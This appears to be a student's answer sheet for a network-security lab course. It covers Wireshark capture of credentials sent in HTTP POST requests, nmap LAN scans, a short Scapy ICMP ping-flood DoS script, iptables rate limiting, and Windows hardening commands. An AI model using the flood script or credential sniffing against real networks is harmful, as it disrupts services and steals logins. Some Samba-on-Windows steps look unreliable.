# MSEI 021

## Question 1: Implement the network sniffers to find out usernames and passwords by retrieving the packets from HTTP POST on any website.
Steps Using Wireshark (No Code Needed):

Open Wireshark.
Select your network interface.
Apply the filter: http.request.method == "POST".
Capture traffic, identify HTTP POST packets, and inspect their payload for credentials.

Note: HTTP POST often transmits data like usernames and passwords in plain text. Ensure ethical and authorized use.


## Question 2: Define the topology used in LAN and scan the network with details like IP, MAC Address, Host name, Username, and OS details of at least 10 machines, and generate the report.
Using nmap Command (No Code Needed):

Install nmap:
```bash 
sudo apt install nmap
```

Scan your LAN:
```bash 
sudo nmap -sn 192.168.1.0/24
```
(Replace 192.168.1.0/24 with your subnet.)

To get detailed information, use:

```bash
sudo nmap -A -T4 192.168.1.0/24
```
(This will provide details like IP, MAC Address, Hostname, OS, and open ports.)

Save the output:
```bash
sudo nmap -A -T4 192.168.1.0/24 > network_report.txt
```
(The results will be stored in network_report.txt.)


## Question 3: Attempt a DoS/DDoS attack on the target computer and display the list of IPs with access details. Prevent the DDoS attack using any firewall.

### Part A: Attempt DoS Attack
Code for DoS Attack Using Scapy:

```python
from scapy.all import *

target_ip = "192.168.1.100"  # Replace with the target IP
packet = IP(dst=target_ip)/ICMP()  # ICMP packets for ping flood

print("Starting DoS attack...")
send(packet, count=10000, inter=0.001)  # Sends 10,000 packets
print("DoS attack completed.")
```

### Part B: Display IPs Who Attempted the Attack

Monitor logs using:
```bash
sudo tail -f /var/log/syslog
```

Use iptables to track incoming traffic:
```bash
sudo iptables -L -n -v
```

### Part C: Prevent DDoS Using Firewall

Commands to Block IPs Using iptables:

1. Block specific attacking IP:

```bash
sudo iptables -A INPUT -s <attacker-ip> -j DROP
```

2. Use rate limiting to mitigate attacks:

```bash
sudo iptables -A INPUT -p tcp --dport 80 -m limit --limit 25/minute --limit-burst 100 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 80 -j DROP
```

## Question 4: Applying OS Filters

### a) Block the USB
Open Command Prompt with Administrator privileges. Disable USB ports:
```bash
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\USBSTOR" /v Start /t REG_DWORD /d 4 /f
```

To re-enable USB ports, use:
```bash
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\USBSTOR" /v Start /t REG_DWORD /d 3 /f
```

### b) Prevent user from changing network settings
Open Command Prompt with Administrator privileges. Apply Group Policy changes:
```bash
gpedit.msc
```
Navigate to User Configuration > Administrative Templates > Network > Network Connections.
Enable the setting Prohibit access to properties of a LAN connection.

### c) Prevent user from accessing Windows Registry
Open Command Prompt with Administrator privileges. Use Group Policy Editor:
```bash
gpedit.msc
```
Navigate to User Configuration > Administrative Templates > System.
Enable the setting Prevent access to registry editing tools.

### d) Prevent user from accessing folders or drives
Open Command Prompt with Administrator privileges. Use Group Policy:
```bash
gpedit.msc
```
Navigate to User Configuration > Administrative Templates > Windows Components > File Explorer.
Enable Prevent access to drives from My Computer and specify the drives to restrict.

## Question 5: Configure Windows Client as a SAMBA Server

### Install Samba on the Windows machine:
Download and install Samba for Windows (e.g., via Cygwin).

### Configure Samba:
Edit the smb.conf file (in the Samba installation folder):
```ini
[shared_folder]
path = C:\shared_folder
read only = no
browsable = yes
guest ok = yes
```

### Start Samba Service:
Use cygwin terminal to start the service:
```bash
net start smbd
net start nmbd
```

## Question 6: OS Hardening Techniques

### a) Create a user with limited privileges
Open Command Prompt with Administrator privileges.
Create a new user:
```bash
net user limiteduser password123 /add
```

Add the user to the Users group (limited privileges):
```bash
net localgroup Users limiteduser /add
```

### b) Change the user password from the command line
Use the net user command:
```bash
net user limiteduser newpassword123
```

### c) Hide files and folders using Command Prompt
Use the attrib command:
```bash
attrib +h +s "C:\path\to\folder"
```

To unhide:
```bash
attrib -h -s "C:\path\to\folder"
```

### d) List all running tasks using Command Prompt
Use the tasklist command:
```bash
tasklist
```

## Question 7: Identify Network Details Using Command Line

### a) Save your IP details in a file
Use the ipconfig command:
```bash
ipconfig > ip_details.txt
```

### b) Find files opened by network users
Use the openfiles command (Administrator required):
```bash
openfiles /query
```

### c) Monitor port activity
Use the netstat command:
```bash
netstat -an
```

To save results:
```bash
netstat -an > port_activity.txt
```

### d) Find DNS of any domain
Use the nslookup command:
```bash
nslookup example.com
```

# Summary of Commands
- Block USB: reg add ...
- Prevent registry/network changes: Use gpedit.msc
- Create user: net user
- Change password: net user username password
- Hide files: attrib
- List tasks: tasklist
- Save IP: ipconfig > file
- Monitor ports: netstat
- Find DNS: nslookup
